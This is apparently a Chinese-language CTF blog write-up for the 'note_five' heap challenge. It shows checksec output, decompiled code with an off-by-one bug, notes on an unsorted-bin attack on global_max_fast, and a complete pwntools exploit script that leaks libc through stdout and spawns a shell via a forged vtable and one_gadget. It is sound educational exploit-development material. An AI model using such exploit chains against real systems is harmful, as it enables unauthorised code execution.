@@ -1,0 +1,205 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>note_file - Dreamcat</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="unsortedbin_attack  global_max_fast保护1234567891011giantbranch@ubuntu:~/Desktop/ruan/attack_global_m,"> 
+    <meta name="author" content="dreamcat"> 
+    <link rel="alternative" href="atom.xml" title="Dreamcat" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="note_file - Dreamcat"/>
+    <meta name="twitter:description" content="unsortedbin_attack  global_max_fast保护1234567891011giantbranch@ubuntu:~/Desktop/ruan/attack_global_m,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="Dreamcat"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="note_file - Dreamcat"/>
+    <meta property="og:description" content="unsortedbin_attack  global_max_fast保护1234567891011giantbranch@ubuntu:~/Desktop/ruan/attack_global_m,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Dreamcat</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">note_file</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">note_file</h1>
+        <div class="stuff">
+            <span>四月 01, 2022</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="unsortedbin-attack-global-max-fast"><a href="#unsortedbin-attack-global-max-fast" class="headerlink" title="unsortedbin_attack  global_max_fast"></a>unsortedbin_attack  global_max_fast</h1><h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/ruan/attack_global_max_fast$ file note_five </span><br><span class="line">note_five: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">99</span>cce6e83f71ad3fa44410c59cd5a40b4ade1acb, stripped</span><br><span class="line">giantbranch@ubuntu:~/Desktop/ruan/attack_global_max_fast$ checksec --file=note_five</span><br><span class="line">[*] <span class="string">&#x27;/home/giantbranch/Desktop/ruan/attack_global_max_fast/note_five&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">giantbranch@ubuntu:~/Desktop/ruan/attack_global_max_fast$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="主要程序："><a href="#主要程序：" class="headerlink" title="主要程序："></a>主要程序：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;infomation management:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. new info&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. edit info&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. delete info&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. exit&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;choice&gt;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> get_num();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx: &quot;</span>);</span><br><span class="line">  idx = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">    size = get_num();</span><br><span class="line">    <span class="keyword">if</span> ( size &gt; <span class="number">0x8F</span> &amp;&amp; size &lt;= <span class="number">0x400</span> )         <span class="comment">// size &gt;fast_max_</span></span><br><span class="line">    &#123;</span><br><span class="line">      heaplist[idx] = <span class="built_in">malloc</span>(size);</span><br><span class="line">      v0 = sizeL;</span><br><span class="line">      sizeL[idx] = size;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;size error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;idx error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">int</span>)v0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_D47</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx: &quot;</span>);</span><br><span class="line">  idx = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt; <span class="number">0</span> || idx &gt; <span class="number">4</span> || !heaplist[idx] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;idx error&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="type">read_t</span>(heaplist[idx], sizeL[idx], <span class="number">10LL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_A70</span><span class="params">(__int64 ptr, <span class="type">signed</span> <span class="type">int</span> size, <span class="type">char</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 buf; <span class="comment">// [rsp+13h] [rbp-Dh] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; size )							<span class="comment">//offbyone</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>) &lt;= <span class="number">0</span> )        <span class="comment">// connot input null</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;read error&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = buf;</span><br><span class="line">    <span class="keyword">if</span> ( buf == a3 )                            <span class="comment">// a3=&#x27;\n&#x27;</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(ptr + i) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_DF5</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx: &quot;</span>);</span><br><span class="line">  idx = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( heaplist[idx] )</span><br><span class="line">      <span class="built_in">free</span>((<span class="type">void</span> *)heaplist[idx]);</span><br><span class="line">    heaplist[idx] = <span class="number">0LL</span>;                        <span class="comment">// no uaf</span></span><br><span class="line">    v0 = sizeL;</span><br><span class="line">    sizeL[idx] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;idx error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">int</span>)v0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>限制了堆块大小，没有输出函数泄露地址，没有UAF。但offbyone</p>
+<h2 id="思路：unsortedbins-attack-攻击global-max-fast，将堆块放入fastbins"><a href="#思路：unsortedbins-attack-攻击global-max-fast，将堆块放入fastbins" class="headerlink" title="思路：unsortedbins attack 攻击global_max_fast，将堆块放入fastbins."></a>思路：unsortedbins attack 攻击global_max_fast，将堆块放入fastbins.</h2><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><h2 id="•unsorted-bin-概述"><a href="#•unsorted-bin-概述" class="headerlink" title="•unsorted bin 概述"></a>•unsorted bin 概述</h2><p>•当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中</p>
+<p>•释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中</p>
+<p>•当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话</p>
+<p>•Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，即<strong>插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong></p>
+<p>•在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中</p>
+<p><img src="C:\Users\32644\AppData\Roaming\Typora\typora-user-images\image-20220401163135175.png" alt="image-20220401163135175"></p>
+<p>如果我们控制了 bk 的值，我们就能将 unsorted_chunks (av) 写到bk+0x10地址，这是一个很大的值</p>
+<h2 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h2><p>1，构造 overlap，实现freechunk的覆盖</p>
+<p>2：修改unsorted_chunk的bk,</p>
+<p>​        <em>问题，pie保护导致没有地址，没有输出但上述导致地址无法泄露，如何覆盖到global_max_fast?</em></p>
+<p>​        </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line"><span class="number">0x56021208d000</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">135169</span>, </span><br><span class="line">  fd = <span class="number">0x7fb7435a7b78</span> &lt;main_arena+<span class="number">88</span>&gt;, </span><br><span class="line">  bk = <span class="number">0x7fb7435a7b78</span> &lt;main_arena+<span class="number">88</span>&gt;, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p &amp;global_max_fast</span><br><span class="line">$<span class="number">1</span> = (<span class="type">size_t</span> *) <span class="number">0x7fb7435a97f8</span> &lt;global_max_fast&gt;</span><br><span class="line">pwndbg&gt; p &amp;main_arena</span><br><span class="line">$<span class="number">2</span> = (<span class="keyword">struct</span> malloc_state *) <span class="number">0x7fb7435a7b20</span> &lt;main_arena&gt;</span><br><span class="line">pwndbg&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>最低三字节不会变，末尾第4字节不确定，但是偏移量不变,爆破</p>
+<p>•接着利用fastbin attack攻击stdout-0x51处，我们要攻击stdout结构体来泄露libc地址</p>
+<p>•stdout-0x51处有一个错位的0xff</p>
+<p>•泄露libc之后就用和house of orange一样的技巧来getshell，即伪造stderr的vtable，触发malloc_printerr来getshell</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,sz</span>):</span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(sz))</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">	cmd(<span class="number">3</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">9999</span></span>):</span><br><span class="line">	<span class="keyword">global</span> p</span><br><span class="line">	<span class="keyword">if</span> host:</span><br><span class="line">		p = remote(host,port)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p = process(<span class="string">&quot;./note_five&quot;</span>)</span><br><span class="line">		gdb.attach(p)</span><br><span class="line"></span><br><span class="line">	add(<span class="number">0</span>,<span class="number">0x98</span>)</span><br><span class="line">	add(<span class="number">1</span>,<span class="number">0xa8</span>)</span><br><span class="line">	add(<span class="number">2</span>,<span class="number">0x1e8</span>)</span><br><span class="line">	add(<span class="number">3</span>,<span class="number">0xe8</span>)</span><br><span class="line">	</span><br><span class="line">	dele(<span class="number">1</span>)</span><br><span class="line">	dele(<span class="number">0</span>)</span><br><span class="line">	dele(<span class="number">2</span>)</span><br><span class="line">	dele(<span class="number">3</span>)</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	add(<span class="number">0</span>,<span class="number">0xe8</span>)</span><br><span class="line">	add(<span class="number">1</span>,<span class="number">0xf8</span>)</span><br><span class="line">	add(<span class="number">2</span>,<span class="number">0xf8</span>)</span><br><span class="line">	add(<span class="number">3</span>,<span class="number">0x1f8</span>)</span><br><span class="line">	add(<span class="number">4</span>,<span class="number">0xe8</span>)</span><br><span class="line">	dele(<span class="number">0</span>)</span><br><span class="line">	edit(<span class="number">1</span>,<span class="string">&quot;A&quot;</span>*<span class="number">0xf0</span>+p64(<span class="number">0x1f0</span>)+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	dele(<span class="number">2</span>)</span><br><span class="line">	add(<span class="number">0</span>,<span class="number">0xe8</span>)</span><br><span class="line">	</span><br><span class="line">	t = <span class="built_in">int</span>(raw_input(<span class="string">&#x27;guest: &#x27;</span>))</span><br><span class="line">	<span class="comment"># t = 8</span></span><br><span class="line">	global_maxfast = (t &lt;&lt; <span class="number">12</span>) | <span class="number">0x7f8</span></span><br><span class="line">	</span><br><span class="line">	stdout = global_maxfast-<span class="number">0x11d8</span></span><br><span class="line">	</span><br><span class="line">	edit(<span class="number">1</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>+p16(global_maxfast-<span class="number">0x10</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">	add(<span class="number">2</span>,<span class="number">0x1f8</span>)</span><br><span class="line">	edit(<span class="number">2</span>,<span class="string">&quot;A&quot;</span>*<span class="number">0x1f8</span>+<span class="string">&#x27;\xf1&#x27;</span>)</span><br><span class="line">	edit(<span class="number">0</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">0x98</span>+p64(<span class="number">0xf1</span>)+p16(stdout-<span class="number">0x51</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">	dele(<span class="number">0</span>)</span><br><span class="line">	dele(<span class="number">4</span>)</span><br><span class="line">	</span><br><span class="line">	dele(<span class="number">3</span>)</span><br><span class="line">	add(<span class="number">3</span>,<span class="number">0x2e8</span>)</span><br><span class="line">	edit(<span class="number">3</span>,<span class="string">&quot;A&quot;</span>*<span class="number">0x1f8</span>+p64(<span class="number">0xf1</span>)+<span class="string">&#x27;\xa0\n&#x27;</span>)</span><br><span class="line">	dele(<span class="number">2</span>)</span><br><span class="line">	</span><br><span class="line">	add(<span class="number">0</span>,<span class="number">0xe8</span>)</span><br><span class="line">	add(<span class="number">2</span>,<span class="number">0xe8</span>)</span><br><span class="line">	add(<span class="number">4</span>,<span class="number">0xe8</span>)</span><br><span class="line">	</span><br><span class="line">	edit(<span class="number">4</span>,<span class="string">&#x27;A&#x27;</span>+<span class="string">&quot;\x00&quot;</span>*<span class="number">0x40</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x00\n&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">	p.recv(<span class="number">0x40</span>)</span><br><span class="line">	</span><br><span class="line">	libc.address = u64(p.recv(<span class="number">8</span>))-<span class="number">0x3c5600</span></span><br><span class="line">	info(<span class="string">&quot;libc : &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line">	pause()</span><br><span class="line">	one_gadget = <span class="number">0xf1207</span>+libc.address</span><br><span class="line">	</span><br><span class="line">	payload = <span class="string">&#x27;\x00&#x27;</span>+p64(libc.address+<span class="number">0x3c55e0</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x1</span>)+p64(one_gadget)*<span class="number">2</span>+p64(libc.address+<span class="number">0x3c5600</span>-<span class="number">8</span>)</span><br><span class="line">	edit(<span class="number">4</span>,payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">	add(<span class="number">1</span>,<span class="number">1000</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">	<span class="comment"># elf = ELF(&quot;./mheap&quot;,checksec=False)</span></span><br><span class="line">	main(args[<span class="string">&#x27;REMOTE&#x27;</span>])</span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="false"
+        data-ae="false"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#unsortedbin-attack-global-max-fast"><span class="toc-number">1.</span> <span class="toc-text">unsortedbin_attack  global_max_fast</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.1.</span> <span class="toc-text">保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E7%A8%8B%E5%BA%8F%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">主要程序：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%EF%BC%9Aunsortedbins-attack-%E6%94%BB%E5%87%BBglobal-max-fast%EF%BC%8C%E5%B0%86%E5%A0%86%E5%9D%97%E6%94%BE%E5%85%A5fastbins"><span class="toc-number">1.3.</span> <span class="toc-text">思路：unsortedbins attack 攻击global_max_fast，将堆块放入fastbins.</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%A2unsorted-bin-%E6%A6%82%E8%BF%B0"><span class="toc-number">1.5.</span> <span class="toc-text">•unsorted bin 概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.6.</span> <span class="toc-text">过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.7.</span> <span class="toc-text">exp</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
